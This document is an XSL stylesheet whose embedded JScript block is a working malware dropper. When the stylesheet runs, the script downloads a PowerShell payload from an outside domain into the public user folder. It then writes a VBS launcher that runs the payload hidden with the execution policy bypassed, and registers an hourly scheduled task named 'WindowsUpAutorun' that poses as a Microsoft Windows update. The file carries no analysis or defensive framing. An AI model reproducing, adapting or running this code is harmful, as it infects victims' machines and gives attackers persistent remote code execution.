<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
	<ms:script implements-prefix="user" language="JScript">
	<![CDATA[
	function getCurrentTime(num) {
    var date = new Date();
    var month = zeroFill(date.getMonth() + 1);
    var day = zeroFill(date.getDate());
    var hour = zeroFill(date.getHours());
    var minute = zeroFill(date.getMinutes()+num);
    var second = zeroFill(date.getSeconds());

    var curTime = date.getFullYear() + "-" + month + "-" + day
            + "T" + hour + ":" + minute + ":" + second;
    return curTime;
    }
	
    function zeroFill(i){
    if (i >= 0 && i <= 9) {
        return "0" + i;
    } else {
        return i;
    }
    }
	var xmlHTTP = new ActiveXObject("Msxml2.XMLHTTP.3.0");
	var u="http://defencedrod.in/hgksdhgioh/xpn.ps1"
	xmlHTTP.open("Get", u, false);
	xmlHTTP.send();
	xmlHTTP.responseText;
	var fso = new ActiveXObject("Scripting.FileSystemObject");
	var tf = fso.CreateTextFile("C:\\Users\\public\\xpn32.ps1", true);
    tf.Write(xmlHTTP.responseText);
	tf.Close();

	var fso1 = new ActiveXObject("Scripting.FileSystemObject");
	var tf1 = fso1.CreateTextFile("C:\\Users\\public\\xpn32.vbs", true);	
	tf1.Write("WScript.CreateObject(\"WScript.Shell\").Run \"PowerShell.exe -ExecutionPolicy Bypass -file C:\\Users\\Public\\xpn32.ps1\",0");
	tf1.Close();

	function taskc(tkname,Path,Arguments,sttime){
	var service  = new ActiveXObject("Schedule.Service");
	service.Connect();
	var rootFolder  = service.GetFolder("\\");
	var taskDefinition = service.NewTask(0);
	var regInfo = taskDefinition.RegistrationInfo;
	var principal = taskDefinition.Principal;
	principal.UserId = "";
	principal.LogonType = 3;

	regInfo.Description = "windows update";
	regInfo.Author = "microsoft";
	var settings  = taskDefinition.Settings;
	settings.Enabled = true;
	settings.StartWhenAvailable = true;
	var triggers = taskDefinition.Triggers;
	var trigger  = triggers.Create(1);
	trigger.Id = "TimeTriggerId";
	trigger.Enabled = true;
    trigger.StartBoundary = sttime;
	var repetitionPattern = trigger.Repetition
	repetitionPattern.Interval = "PT1H"
	var actions = taskDefinition.Actions;
	var action = actions.Create(0);
	action.Path = Path;
	action.Arguments = Arguments;
	rootFolder.RegisterTaskDefinition(tkname,taskDefinition,6,"",null,3);
	}
    taskc("WindowsUpAutorun","C:\\Users\\public\\xpn32.vbs","",getCurrentTime(1));
	]]> </ms:script>
</stylesheet>
